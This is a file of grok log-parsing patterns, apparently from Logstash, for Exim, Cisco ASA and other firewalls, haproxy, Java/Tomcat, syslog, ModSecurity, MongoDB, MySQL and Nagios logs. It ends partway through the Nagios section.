EXIM_FLAGS (<=|[-=>*]>|[*]{2}|==)
EXIM_DATE %{YEAR:exim_year}-%{MONTHNUM:exim_month}-%{MONTHDAY:exim_day} %{TIME:exim_time}
EXIM_PID \\[%{POSINT}\\]
EXIM_QT ((\\d+y)?(\\d+w)?(\\d+d)?(\\d+h)?(\\d+m)?(\\d+s)?)
EXIM_EXCLUDE_TERMS (Message is frozen|(Start|End) queue run| Warning: | retry time not reached | no (IP address|host name) found for (IP address|host) | unexpected disconnection while reading SMTP command | no immediate delivery: |another process is handling this message)
EXIM_REMOTE_HOST (H=(%{NOTSPACE:remote_hostname} )?(\\(%{NOTSPACE:remote_heloname}\\) )?\\[%{IP:remote_host}\\])
EXIM_INTERFACE (I=\\[%{IP:exim_interface}\\](:%{NUMBER:exim_interface_port}))
EXIM_PROTOCOL (P=%{NOTSPACE:protocol})
EXIM_MSG_SIZE (S=%{NUMBER:exim_msg_size})
EXIM_HEADER_ID (id=%{NOTSPACE:exim_header_id})
EXIM_SUBJECT (T=%{QS:exim_subject})
# === firewalls ===
# NetScreen firewall logs
NETSCREENSESSIONLOG %{SYSLOGTIMESTAMP:date} %{IPORHOST:device} %{IPORHOST}: NetScreen device_id=%{WORD:device_id}%{DATA}: start_time=%{QUOTEDSTRING:start_time} duration=%{INT:duration} policy_id=%{INT:policy_id} service=%{DATA:service} proto=%{INT:proto} src zone=%{WORD:src_zone} dst zone=%{WORD:dst_zone} action=%{WORD:action} sent=%{INT:sent} rcvd=%{INT:rcvd} src=%{IPORHOST:src_ip} dst=%{IPORHOST:dst_ip} src_port=%{INT:src_port} dst_port=%{INT:dst_port} src-xlated ip=%{IPORHOST:src_xlated_ip} port=%{INT:src_xlated_port} dst-xlated ip=%{IPORHOST:dst_xlated_ip} port=%{INT:dst_xlated_port} session_id=%{INT:session_id} reason=%{GREEDYDATA:reason}

#== Cisco ASA ==
CISCOTAG [A-Z0-9]+-%{INT}-(?:[A-Z0-9_]+)
CISCOTIMESTAMP %{MONTH} +%{MONTHDAY}(?: %{YEAR})? %{TIME}
CISCO_TAGGED_SYSLOG ^<%{POSINT:syslog_pri}>%{CISCOTIMESTAMP:timestamp}( %{SYSLOGHOST:sysloghost})? ?: %%{CISCOTAG:ciscotag}:
# Common Particles
CISCO_ACTION Built|Teardown|Deny|Denied|denied|requested|permitted|denied by ACL|discarded|est-allowed|Dropping|created|deleted
CISCO_REASON Duplicate TCP SYN|Failed to locate egress interface|Invalid transport field|No matching connection|DNS Response|DNS Query|(?:%{WORD}\\s*)*
CISCO_DIRECTION Inbound|inbound|Outbound|outbound
CISCO_INTERVAL first hit|%{INT}-second interval
CISCO_XLATE_TYPE static|dynamic
# ASA-1-104001
CISCOFW104001 \\((?:Primary|Secondary)\\) Switching to ACTIVE - %{GREEDYDATA:switch_reason}
# ASA-1-104002
CISCOFW104002 \\((?:Primary|Secondary)\\) Switching to STANDBY - %{GREEDYDATA:switch_reason}
# ASA-1-104003
CISCOFW104003 \\((?:Primary|Secondary)\\) Switching to FAILED\\.
# ASA-1-104004
CISCOFW104004 \\((?:Primary|Secondary)\\) Switching to OK\\.
# ASA-1-105003
CISCOFW105003 \\((?:Primary|Secondary)\\) Monitoring on [Ii]nterface %{GREEDYDATA:interface_name} waiting
# ASA-1-105004
CISCOFW105004 \\((?:Primary|Secondary)\\) Monitoring on [Ii]nterface %{GREEDYDATA:interface_name} normal
# ASA-1-105005
CISCOFW105005 \\((?:Primary|Secondary)\\) Lost Failover communications with mate on [Ii]nterface %{GREEDYDATA:interface_name}
# ASA-1-105008
CISCOFW105008 \\((?:Primary|Secondary)\\) Testing [Ii]nterface %{GREEDYDATA:interface_name}
# ASA-1-105009
CISCOFW105009 \\((?:Primary|Secondary)\\) Testing on [Ii]nterface %{GREEDYDATA:interface_name} (?:Passed|Failed)
# ASA-2-106001
CISCOFW106001 %{CISCO_DIRECTION:direction} %{WORD:protocol} connection %{CISCO_ACTION:action} from %{IP:src_ip}/%{INT:src_port} to %{IP:dst_ip}/%{INT:dst_port} flags %{GREEDYDATA:tcp_flags} on interface %{GREEDYDATA:interface}
# ASA-2-106006, ASA-2-106007, ASA-2-106010
CISCOFW106006_106007_106010 %{CISCO_ACTION:action} %{CISCO_DIRECTION:direction} %{WORD:protocol} (?:from|src) %{IP:src_ip}/%{INT:src_port}(\\(%{DATA:src_fwuser}\\))? (?:to|dst) %{IP:dst_ip}/%{INT:dst_port}(\\(%{DATA:dst_fwuser}\\))? (?:on interface %{DATA:interface}|due to %{CISCO_REASON:reason})
# ASA-3-106014
CISCOFW106014 %{CISCO_ACTION:action} %{CISCO_DIRECTION:direction} %{WORD:protocol} src %{DATA:src_interface}:%{IP:src_ip}(\\(%{DATA:src_fwuser}\\))? dst %{DATA:dst_interface}:%{IP:dst_ip}(\\(%{DATA:dst_fwuser}\\))? \\(type %{INT:icmp_type}, code %{INT:icmp_code}\\)
# ASA-6-106015
CISCOFW106015 %{CISCO_ACTION:action} %{WORD:protocol} \\(%{DATA:policy_id}\\) from %{IP:src_ip}/%{INT:src_port} to %{IP:dst_ip}/%{INT:dst_port} flags %{DATA:tcp_flags}  on interface %{GREEDYDATA:interface}
# ASA-1-106021
CISCOFW106021 %{CISCO_ACTION:action} %{WORD:protocol} reverse path check from %{IP:src_ip} to %{IP:dst_ip} on interface %{GREEDYDATA:interface}
# ASA-4-106023
CISCOFW106023 %{CISCO_ACTION:action}( protocol)? %{WORD:protocol} src %{DATA:src_interface}:%{DATA:src_ip}(/%{INT:src_port})?(\\(%{DATA:src_fwuser}\\))? dst %{DATA:dst_interface}:%{DATA:dst_ip}(/%{INT:dst_port})?(\\(%{DATA:dst_fwuser}\\))?( \\(type %{INT:icmp_type}, code %{INT:icmp_code}\\))? by access-group "?%{DATA:policy_id}"? \\[%{DATA:hashcode1}, %{DATA:hashcode2}\\]
# ASA-4-106100, ASA-4-106102, ASA-4-106103
CISCOFW106100_2_3 access-list %{NOTSPACE:policy_id} %{CISCO_ACTION:action} %{WORD:protocol} for user '%{DATA:src_fwuser}' %{DATA:src_interface}/%{IP:src_ip}\\(%{INT:src_port}\\) -> %{DATA:dst_interface}/%{IP:dst_ip}\\(%{INT:dst_port}\\) hit-cnt %{INT:hit_count} %{CISCO_INTERVAL:interval} \\[%{DATA:hashcode1}, %{DATA:hashcode2}\\]
# ASA-5-106100
CISCOFW106100 access-list %{NOTSPACE:policy_id} %{CISCO_ACTION:action} %{WORD:protocol} %{DATA:src_interface}/%{IP:src_ip}\\(%{INT:src_port}\\)(\\(%{DATA:src_fwuser}\\))? -> %{DATA:dst_interface}/%{IP:dst_ip}\\(%{INT:dst_port}\\)(\\(%{DATA:src_fwuser}\\))? hit-cnt %{INT:hit_count} %{CISCO_INTERVAL:interval} \\[%{DATA:hashcode1}, %{DATA:hashcode2}\\]
# ASA-6-110002
CISCOFW110002 %{CISCO_REASON:reason} for %{WORD:protocol} from %{DATA:src_interface}:%{IP:src_ip}/%{INT:src_port} to %{IP:dst_ip}/%{INT:dst_port}
# ASA-6-302010
CISCOFW302010 %{INT:connection_count} in use, %{INT:connection_count_max} most used
# ASA-6-302013, ASA-6-302014, ASA-6-302015, ASA-6-302016
CISCOFW302013_302014_302015_302016 %{CISCO_ACTION:action}(?: %{CISCO_DIRECTION:direction})? %{WORD:protocol} connection %{INT:connection_id} for %{DATA:src_interface}:%{IP:src_ip}/%{INT:src_port}( \\(%{IP:src_mapped_ip}/%{INT:src_mapped_port}\\))?(\\(%{DATA:src_fwuser}\\))? to %{DATA:dst_interface}:%{IP:dst_ip}/%{INT:dst_port}( \\(%{IP:dst_mapped_ip}/%{INT:dst_mapped_port}\\))?(\\(%{DATA:dst_fwuser}\\))?( duration %{TIME:duration} bytes %{INT:bytes})?(?: %{CISCO_REASON:reason})?( \\(%{DATA:user}\\))?
# ASA-6-302020, ASA-6-302021
CISCOFW302020_302021 %{CISCO_ACTION:action}(?: %{CISCO_DIRECTION:direction})? %{WORD:protocol} connection for faddr %{IP:dst_ip}/%{INT:icmp_seq_num}(?:\\(%{DATA:fwuser}\\))? gaddr %{IP:src_xlated_ip}/%{INT:icmp_code_xlated} laddr %{IP:src_ip}/%{INT:icmp_code}( \\(%{DATA:user}\\))?
# ASA-6-305011
CISCOFW305011 %{CISCO_ACTION:action} %{CISCO_XLATE_TYPE:xlate_type} %{WORD:protocol} translation from %{DATA:src_interface}:%{IP:src_ip}(/%{INT:src_port})?(\\(%{DATA:src_fwuser}\\))? to %{DATA:src_xlated_interface}:%{IP:src_xlated_ip}/%{DATA:src_xlated_port}
# ASA-3-313001, ASA-3-313004, ASA-3-313008
CISCOFW313001_313004_313008 %{CISCO_ACTION:action} %{WORD:protocol} type=%{INT:icmp_type}, code=%{INT:icmp_code} from %{IP:src_ip} on interface %{DATA:interface}( to %{IP:dst_ip})?
# ASA-4-313005
CISCOFW313005 %{CISCO_REASON:reason} for %{WORD:protocol} error message: %{WORD:err_protocol} src %{DATA:err_src_interface}:%{IP:err_src_ip}(\\(%{DATA:err_src_fwuser}\\))? dst %{DATA:err_dst_interface}:%{IP:err_dst_ip}(\\(%{DATA:err_dst_fwuser}\\))? \\(type %{INT:err_icmp_type}, code %{INT:err_icmp_code}\\) on %{DATA:interface} interface\\.  Original IP payload: %{WORD:protocol} src %{IP:orig_src_ip}/%{INT:orig_src_port}(\\(%{DATA:orig_src_fwuser}\\))? dst %{IP:orig_dst_ip}/%{INT:orig_dst_port}(\\(%{DATA:orig_dst_fwuser}\\))?
# ASA-5-321001
CISCOFW321001 Resource '%{WORD:resource_name}' limit of %{POSINT:resource_limit} reached for system
# ASA-4-402117
CISCOFW402117 %{WORD:protocol}: Received a non-IPSec packet \\(protocol= %{WORD:orig_protocol}\\) from %{IP:src_ip} to %{IP:dst_ip}
# ASA-4-402119
CISCOFW402119 %{WORD:protocol}: Received an %{WORD:orig_protocol} packet \\(SPI= %{DATA:spi}, sequence number= %{DATA:seq_num}\\) from %{IP:src_ip} \\(user= %{DATA:user}\\) to %{IP:dst_ip} that failed anti-replay checking
# ASA-4-419001
CISCOFW419001 %{CISCO_ACTION:action} %{WORD:protocol} packet from %{DATA:src_interface}:%{IP:src_ip}/%{INT:src_port} to %{DATA:dst_interface}:%{IP:dst_ip}/%{INT:dst_port}, reason: %{GREEDYDATA:reason}
# ASA-4-419002
CISCOFW419002 %{CISCO_REASON:reason} from %{DATA:src_interface}:%{IP:src_ip}/%{INT:src_port} to %{DATA:dst_interface}:%{IP:dst_ip}/%{INT:dst_port} with different initial sequence number
# ASA-4-500004
CISCOFW500004 %{CISCO_REASON:reason} for protocol=%{WORD:protocol}, from %{IP:src_ip}/%{INT:src_port} to %{IP:dst_ip}/%{INT:dst_port}
# ASA-6-602303, ASA-6-602304
CISCOFW602303_602304 %{WORD:protocol}: An %{CISCO_DIRECTION:direction} %{GREEDYDATA:tunnel_type} SA \\(SPI= %{DATA:spi}\\) between %{IP:src_ip} and %{IP:dst_ip} \\(user= %{DATA:user}\\) has been %{CISCO_ACTION:action}
# ASA-7-710001, ASA-7-710002, ASA-7-710003, ASA-7-710005, ASA-7-710006
CISCOFW710001_710002_710003_710005_710006 %{WORD:protocol} (?:request|access) %{CISCO_ACTION:action} from %{IP:src_ip}/%{INT:src_port} to %{DATA:dst_interface}:%{IP:dst_ip}/%{INT:dst_port}
# ASA-6-713172
CISCOFW713172 Group = %{GREEDYDATA:group}, IP = %{IP:src_ip}, Automatic NAT Detection Status:\\s+Remote end\\s*%{DATA:is_remote_natted}\\s*behind a NAT device\\s+This\\s+end\\s*%{DATA:is_local_natted}\\s*behind a NAT device
# ASA-4-733100
CISCOFW733100 \\[\\s*%{DATA:drop_type}\\s*\\] drop %{DATA:drop_rate_id} exceeded. Current burst rate is %{INT:drop_rate_current_burst} per second, max configured rate is %{INT:drop_rate_max_burst}; Current average rate is %{INT:drop_rate_current_avg} per second, max configured rate is %{INT:drop_rate_max_avg}; Cumulative total count is %{INT:drop_total_count}
#== End Cisco ASA ==

# Shorewall firewall logs
SHOREWALL (%{SYSLOGTIMESTAMP:timestamp}) (%{WORD:nf_host}) kernel:.*Shorewall:(%{WORD:nf_action1})?:(%{WORD:nf_action2})?.*IN=(%{USERNAME:nf_in_interface})?.*(OUT= *MAC=(%{COMMONMAC:nf_dst_mac}):(%{COMMONMAC:nf_src_mac})?|OUT=%{USERNAME:nf_out_interface}).*SRC=(%{IPV4:nf_src_ip}).*DST=(%{IPV4:nf_dst_ip}).*LEN=(%{WORD:nf_len}).*?TOS=(%{WORD:nf_tos}).*?PREC=(%{WORD:nf_prec}).*?TTL=(%{INT:nf_ttl}).*?ID=(%{INT:nf_id}).*?PROTO=(%{WORD:nf_protocol}).*?SPT=(%{INT:nf_src_port}?.*DPT=%{INT:nf_dst_port}?.*)
#== End Shorewall
# === haproxy ===
## These patterns were tested w/ haproxy-1.4.15

## Documentation of the haproxy log formats can be found at the following links:
## http://code.google.com/p/haproxy-docs/wiki/HTTPLogFormat
## http://code.google.com/p/haproxy-docs/wiki/TCPLogFormat

HAPROXYTIME %{HOUR:haproxy_hour}:%{MINUTE:haproxy_minute}(?::%{SECOND:haproxy_second})
HAPROXYDATE %{MONTHDAY:haproxy_monthday}/%{MONTH:haproxy_month}/%{YEAR:haproxy_year}:%{HAPROXYTIME:haproxy_time}.%{INT:haproxy_milliseconds}

# Override these default patterns to parse out what is captured in your haproxy.cfg
HAPROXYCAPTUREDREQUESTHEADERS %{DATA:captured_request_headers}
HAPROXYCAPTUREDRESPONSEHEADERS %{DATA:captured_response_headers}

# Example:
#  These haproxy config lines will add data to the logs that are captured
#  by the patterns below. Place them in your custom patterns directory to
#  override the defaults.
#
#  capture request header Host len 40
#  capture request header X-Forwarded-For len 50
#  capture request header Accept-Language len 50
#  capture request header Referer len 200
#  capture request header User-Agent len 200
#
#  capture response header Content-Type len 30
#  capture response header Content-Encoding len 10
#  capture response header Cache-Control len 200
#  capture response header Last-Modified len 200
#
# HAPROXYCAPTUREDREQUESTHEADERS %{DATA:request_header_host}\\|%{DATA:request_header_x_forwarded_for}\\|%{DATA:request_header_accept_language}\\|%{DATA:request_header_referer}\\|%{DATA:request_header_user_agent}
# HAPROXYCAPTUREDRESPONSEHEADERS %{DATA:response_header_content_type}\\|%{DATA:response_header_content_encoding}\\|%{DATA:response_header_cache_control}\\|%{DATA:response_header_last_modified}

# parse a haproxy 'httplog' line
HAPROXYHTTPBASE %{IP:client_ip}:%{INT:client_port} \\[%{HAPROXYDATE:accept_date}\\] %{NOTSPACE:frontend_name} %{NOTSPACE:backend_name}/%{NOTSPACE:server_name} %{INT:time_request}/%{INT:time_queue}/%{INT:time_backend_connect}/%{INT:time_backend_response}/%{NOTSPACE:time_duration} %{INT:http_status_code} %{NOTSPACE:bytes_read} %{DATA:captured_request_cookie} %{DATA:captured_response_cookie} %{NOTSPACE:termination_state} %{INT:actconn}/%{INT:feconn}/%{INT:beconn}/%{INT:srvconn}/%{NOTSPACE:retries} %{INT:srv_queue}/%{INT:backend_queue} (\\{%{HAPROXYCAPTUREDREQUESTHEADERS}\\})?( )?(\\{%{HAPROXYCAPTUREDRESPONSEHEADERS}\\})?( )?"(<BADREQ>|(%{WORD:http_verb} (%{URIPROTO:http_proto}://)?(?:%{USER:http_user}(?::[^@]*)?@)?(?:%{URIHOST:http_host})?(?:%{URIPATHPARAM:http_request})?( HTTP/%{NUMBER:http_version})?))?"

HAPROXYHTTP (?:%{SYSLOGTIMESTAMP:syslog_timestamp}|%{TIMESTAMP_ISO8601:timestamp8601}) %{IPORHOST:syslog_server} %{SYSLOGPROG}: %{HAPROXYHTTPBASE}

# parse a haproxy 'tcplog' line
HAPROXYTCP (?:%{SYSLOGTIMESTAMP:syslog_timestamp}|%{TIMESTAMP_ISO8601:timestamp8601}) %{IPORHOST:syslog_server} %{SYSLOGPROG}: %{IP:client_ip}:%{INT:client_port} \\[%{HAPROXYDATE:accept_date}\\] %{NOTSPACE:frontend_name} %{NOTSPACE:backend_name}/%{NOTSPACE:server_name} %{INT:time_queue}/%{INT:time_backend_connect}/%{NOTSPACE:time_duration} %{NOTSPACE:bytes_read} %{NOTSPACE:termination_state} %{INT:actconn}/%{INT:feconn}/%{INT:beconn}/%{INT:srvconn}/%{NOTSPACE:retries} %{INT:srv_queue}/%{INT:backend_queue}
# === java ===
JAVACLASS (?:[a-zA-Z$_][a-zA-Z$_0-9]*\\.)*[a-zA-Z$_][a-zA-Z$_0-9]*
#Space is an allowed character to match special cases like 'Native Method' or 'Unknown Source'
JAVAFILE (?:[A-Za-z0-9_. -]+)
#Allow special <init> method
JAVAMETHOD (?:(<init>)|[a-zA-Z$_][a-zA-Z$_0-9]*)
#Line number is optional in special cases 'Native method' or 'Unknown source'
JAVASTACKTRACEPART %{SPACE}at %{JAVACLASS:class}\\.%{JAVAMETHOD:method}\\(%{JAVAFILE:file}(?::%{NUMBER:line})?\\)
# Java Logs
JAVATHREAD (?:[A-Z]{2}-Processor[\\d]+)
##JAVACLASS (?:[a-zA-Z0-9-]+\\.)+[A-Za-z0-9$]+
##JAVAFILE (?:[A-Za-z0-9_.-]+)
##JAVASTACKTRACEPART at %{JAVACLASS:class}\\.%{WORD:method}\\(%{JAVAFILE:file}:%{NUMBER:line}\\)
JAVALOGMESSAGE (.*)
# MMM dd, yyyy HH:mm:ss eg: Jan 9, 2014 7:13:13 AM
CATALINA_DATESTAMP %{MONTH} %{MONTHDAY}, 20%{YEAR} %{HOUR}:?%{MINUTE}(?::?%{SECOND}) (?:AM|PM)
# yyyy-MM-dd HH:mm:ss,SSS ZZZ eg: 2014-01-09 17:32:25,527 -0800
TOMCAT_DATESTAMP 20%{YEAR}-%{MONTHNUM}-%{MONTHDAY} %{HOUR}:?%{MINUTE}(?::?%{SECOND}) %{ISO8601_TIMEZONE}
CATALINALOG %{CATALINA_DATESTAMP:timestamp} %{JAVACLASS:class} %{JAVALOGMESSAGE:logmessage}
# 2014-01-09 20:03:28,269 -0800 | ERROR | com.example.service.ExampleService - something compeletely unexpected happened...
TOMCATLOG %{TOMCAT_DATESTAMP:timestamp} \\| %{LOGLEVEL:level} \\| %{JAVACLASS:class} - %{JAVALOGMESSAGE:logmessage}
# === junos ===
# JUNOS 11.4 RT_FLOW patterns
RT_FLOW_EVENT (RT_FLOW_SESSION_CREATE|RT_FLOW_SESSION_CLOSE|RT_FLOW_SESSION_DENY)

RT_FLOW1 %{RT_FLOW_EVENT:event}: %{GREEDYDATA:close-reason}: %{IP:src-ip}/%{INT:src-port}->%{IP:dst-ip}/%{INT:dst-port} %{DATA:service} %{IP:nat-src-ip}/%{INT:nat-src-port}->%{IP:nat-dst-ip}/%{INT:nat-dst-port} %{DATA:src-nat-rule-name} %{DATA:dst-nat-rule-name} %{INT:protocol-id} %{DATA:policy-name} %{DATA:from-zone} %{DATA:to-zone} %{INT:session-id} \\d+\\(%{DATA:sent}\\) \\d+\\(%{DATA:received}\\) %{INT:elapsed-time} .*

RT_FLOW2 %{RT_FLOW_EVENT:event}: session created %{IP:src-ip}/%{INT:src-port}->%{IP:dst-ip}/%{INT:dst-port} %{DATA:service} %{IP:nat-src-ip}/%{INT:nat-src-port}->%{IP:nat-dst-ip}/%{INT:nat-dst-port} %{DATA:src-nat-rule-name} %{DATA:dst-nat-rule-name} %{INT:protocol-id} %{DATA:policy-name} %{DATA:from-zone} %{DATA:to-zone} %{INT:session-id} .*

RT_FLOW3 %{RT_FLOW_EVENT:event}: session denied %{IP:src-ip}/%{INT:src-port}->%{IP:dst-ip}/%{INT:dst-port} %{DATA:service} %{INT:protocol-id}\\(\\d\\) %{DATA:policy-name} %{DATA:from-zone} %{DATA:to-zone} .*

# === linux-syslog ===
SYSLOG5424PRINTASCII [!-~]+

SYSLOGBASE2 (?:%{SYSLOGTIMESTAMP:timestamp}|%{TIMESTAMP_ISO8601:timestamp8601}) (?:%{SYSLOGFACILITY} )?%{SYSLOGHOST:logsource}+(?: %{SYSLOGPROG}:|)
SYSLOGPAMSESSION %{SYSLOGBASE} %{GREEDYDATA:message}%{WORD:pam_module}\\(%{DATA:pam_caller}\\): session %{WORD:pam_session_state} for user %{USERNAME:username}(?: by %{GREEDYDATA:pam_by})?

CRON_ACTION [A-Z ]+
CRONLOG %{SYSLOGBASE} \\(%{USER:user}\\) %{CRON_ACTION:action} \\(%{DATA:message}\\)

SYSLOGLINE %{SYSLOGBASE2} %{GREEDYDATA:message}

# IETF 5424 syslog(8) format (see http://www.rfc-editor.org/info/rfc5424)
SYSLOG5424PRI <%{NONNEGINT:syslog5424_pri}>
SYSLOG5424SD \\[%{DATA}\\]+
SYSLOG5424BASE %{SYSLOG5424PRI}%{NONNEGINT:syslog5424_ver} +(?:%{TIMESTAMP_ISO8601:syslog5424_ts}|-) +(?:%{HOSTNAME:syslog5424_host}|-) +(-|%{SYSLOG5424PRINTASCII:syslog5424_app}) +(-|%{SYSLOG5424PRINTASCII:syslog5424_proc}) +(-|%{SYSLOG5424PRINTASCII:syslog5424_msgid}) +(?:%{SYSLOG5424SD:syslog5424_sd}|-|)

SYSLOG5424LINE %{SYSLOG5424BASE} +%{GREEDYDATA:syslog5424_msg}
# === mcollective ===
# Remember, these can be multi-line events.
MCOLLECTIVE ., \\[%{TIMESTAMP_ISO8601:timestamp} #%{POSINT:pid}\\]%{SPACE}%{LOGLEVEL:event_level}

MCOLLECTIVEAUDIT %{TIMESTAMP_ISO8601:timestamp}:
# === modsecurity ===
APACHEERRORTIME %{DAY} %{MONTH} %{MONTHDAY} %{TIME} %{YEAR}
APACHEERRORPREFIX \\[%{APACHEERRORTIME:timestamp}\\] \\[%{NOTSPACE:apacheseverity}\\] (\\[pid %{INT}:tid %{INT}\\] )?\\[client %{IPORHOST:sourcehost}(:%{INT:source_port})?\\] (\\[client %{IPORHOST}\\])?
GENERICAPACHEERROR %{APACHEERRORPREFIX} %{GREEDYDATA:message}
MODSECPREFIX %{APACHEERRORPREFIX} ModSecurity: %{NOTSPACE:modsecseverity}\\. %{GREEDYDATA:modsecmessage}
MODSECRULEFILE \\[file %{QUOTEDSTRING:rulefile}\\]
MODSECRULELINE \\[line %{QUOTEDSTRING:ruleline}\\]
MODSECMATCHOFFSET \\[offset %{QUOTEDSTRING:matchoffset}\\]
MODSECRULEID \\[id %{QUOTEDSTRING:ruleid}\\]
MODSECRULEREV \\[rev %{QUOTEDSTRING:rulerev}\\]
MODSECRULEMSG \\[msg %{QUOTEDSTRING:rulemessage}\\]
MODSECRULEDATA \\[data %{QUOTEDSTRING:ruledata}\\]
MODSECRULESEVERITY \\[severity ["']%{WORD:ruleseverity}["']\\]
MODSECRULEVERS \\[ver "[^"]+"\\]
MODSECRULETAGS (?:\\[tag %{QUOTEDSTRING:ruletag0}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag1}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag2}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag3}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag4}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag5}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag6}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag7}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag8}\\] )?(?:\\[tag %{QUOTEDSTRING:ruletag9}\\] )?(?:\\[tag %{QUOTEDSTRING}\\] )*
MODSECHOSTNAME \\[hostname ['"]%{DATA:targethost}["']\\]
MODSECURI \\[uri ["']%{DATA:targeturi}["']\\]
MODSECUID \\[unique_id %{QUOTEDSTRING:uniqueid}\\]
MODSECAPACHEERROR %{MODSECPREFIX} %{MODSECRULEFILE} %{MODSECRULELINE} (?:%{MODSECMATCHOFFSET} )?(?:%{MODSECRULEID} )?(?:%{MODSECRULEREV} )?(?:%{MODSECRULEMSG} )?(?:%{MODSECRULEDATA} )?(?:%{MODSECRULESEVERITY} )?(?:%{MODSECRULEVERS} )?%{MODSECRULETAGS}%{MODSECHOSTNAME} %{MODSECURI} %{MODSECUID}
# === mongodb ===
MONGO_LOG %{SYSLOGTIMESTAMP:timestamp} \\[%{WORD:component}\\] %{GREEDYDATA:message}
MONGO_QUERY \\{ \\{ .* \\} ntoreturn: \\}
MONGO_WORDDASH \\b[\\w-]+\\b
MONGO_SLOWQUERY %{WORD} %{MONGO_WORDDASH:database}\\.%{MONGO_WORDDASH:collection} %{WORD}: %{MONGO_QUERY:query} %{WORD}:%{NONNEGINT:ntoreturn} %{WORD}:%{NONNEGINT:ntoskip} %{WORD}:%{NONNEGINT:nscanned}.*nreturned:%{NONNEGINT:nreturned}..+ %{POSINT:duration}ms
MONGO3_SEVERITY \\w
MONGO3_COMPONENT %{WORD}|-
MONGO3_LOG %{TIMESTAMP_ISO8601:timestamp} %{MONGO3_SEVERITY:severity} %{MONGO3_COMPONENT:component}%{SPACE}(?:\\[%{DATA:context}\\])? %{GREEDYDATA:message}
# === mysql ===
MYSQL_AUTH_FAIL %{TIMESTAMP_ISO8601:time} %{NUMBER} \\[Note\\] Access denied for user '%{DATA:user}'@'%{IP:source_ip}' \\(using password: %{WORD:using_password}\\)

# === nagios ===
##################################################################################
##################################################################################
# Chop Nagios log files to smithereens!
#
# A set of GROK filters to process logfiles generated by Nagios.
# While it does not, this set intends to cover all possible Nagios logs.
#
# Some more work needs to be done to cover all External Commands:
#	http://old.nagios.org/developerinfo/externalcommands/commandlist.php
#
# If you need some support on these rules please contact:
#	Jelle Smet http://smetj.net
#
#################################################################################
#################################################################################

NAGIOSTIME \\[%{NUMBER:nagios_epoch}\\]

###############################################
######## Begin nagios log types
###############################################
NAGIOS_TYPE_CURRENT_SERVICE_STATE CURRENT SERVICE STATE
NAGIOS_TYPE_CURRENT_HOST_STATE CURRENT HOST STATE

NAGIOS_TYPE_SERVICE_NOTIFICATION SERVICE NOTIFICATION
NAGIOS_TYPE_HOST_NOTIFICATION HOST NOTIFICATION

NAGIOS_TYPE_SERVICE_ALERT SERVICE ALERT
NAGIOS_TYPE_HOST_ALERT HOST ALERT

NAGIOS_TYPE_SERVICE_FLAPPING_ALERT SERVICE FLAPPING ALERT
NAGIOS_TYPE_HOST_FLAPPING_ALERT HOST FLAPPING ALERT

NAGIOS_TYPE_SERVICE_DOWNTIME_ALERT SERVICE DOWNTIME ALERT
NAGIOS_TYPE_HOST_DOWNTIME_ALERT HOST DOWNTIME ALERT

NAGIOS_TYPE_PASSIVE_SERVICE_CHECK PASSIVE SERVICE CHECK
NAGIOS_TYPE_PASSIVE_HOST_CHECK PASSIVE HOST CHECK

NAGIOS_TYPE_SERVICE_EVENT_HANDLER SERVICE EVENT HANDLER
NAGIOS_TYPE_HOST_EVENT_HANDLER HOST EVENT HANDLER

NAGIOS_TYPE_EXTERNAL_COMMAND EXTERNAL COMMAND
NAGIOS_TYPE_TIMEPERIOD_TRANSITION TIMEPERIOD TRANSITION
###############################################
######## End nagios log types
###############################################

###############################################
######## Begin external check types
###############################################
NAGIOS_EC_DISABLE_SVC_CHECK DISABLE_SVC_CHECK
NAGIOS_EC_ENABLE_SVC_CHECK ENABLE_SVC_CHECK
NAGIOS_EC_DISABLE_HOST_CHECK DISABLE_HOST_CHECK
NAGIOS_EC_ENABLE_HOST_CHECK ENABLE_HOST_CHECK
NAGIOS_EC_PROCESS_SERVICE_CHECK_RESULT PROCESS_SERVICE_CHECK_RESULT
NAGIOS_EC_PROCESS_HOST_CHECK_RESULT PROCESS_HOST_CHECK_RESULT
NAGIOS_EC_SCHEDULE_SERVICE_DOWNTIME SCHEDULE_SERVICE_DOWNTIME
NAGIOS_EC_SCHEDULE_HOST_DOWNTIME SCHEDULE_HOST_DOWNTIME
NAGIOS_EC_DISABLE_HOST_SVC_NOTIFICATIONS DISABLE_HOST_SVC_NOTIFICATIONS
NAGIOS_EC_ENABLE_HOST_SVC_NOTIFICATIONS ENABLE_HOST_SVC_NOTIFICATIONS
NAGIOS_EC_DISABLE_HOST_NOTIFICATIONS DISABLE_HOST_NOTIFICATIONS
NAGIOS_EC_ENABLE_HOST_NOTIFICATIONS ENABLE_HOST_NOTIFICATIONS
NAGIOS_EC_DISABLE_SVC_NOTIFICATIONS DISABLE_SVC_NOTIFICATIONS
NAGIOS_EC_ENABLE_SVC_NOTIFICATIONS ENABLE_SVC_NOTIFICATIONS
###############################################
######## End external check types
###############################################
NAGIOS_WARNING Warning:%{SPACE}%{GREEDYDATA:nagios_message}

NAGIOS_CURRENT_SERVICE_STATE %{NAGIOS_TYPE_CURRENT_SERVICE_STATE:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{DATA:nagios_statetype};%{DATA:nagios_statecode};%{GREEDYDATA:nagios_message}
NAGIOS_CURRENT_HOST_STATE %{NAGIOS_TYPE_CURRENT_HOST_STATE:nagios_type}: %{DATA:nagios_hostname};%{DATA:nagios_state};%{DATA:nagios_statetype};%{DATA:nagios_statecode};%{GREEDYDATA:nagios_message}

NAGIOS_SERVICE_NOTIFICATION %{NAGIOS_TYPE_SERVICE_NOTIFICATION:nagios_type}: %{DATA:nagios_notifyname};%{DATA:nagios_hostname};%{DATA:nagios_service};%{DATA:nagios_state};%{DATA:nagios_contact};%{GREEDYDATA:nagios_message}
NAGIOS_HOST_NOTIFICATION %{NAGIOS_TYPE_HOST_NOTIFICATION:nagios_type}: %{DATA:nagios_notifyname};%{DATA:nagios_hostname};%{DATA:nagios_state};%{DATA:nagios_contact};%{GREEDYDATA:nagios_message}

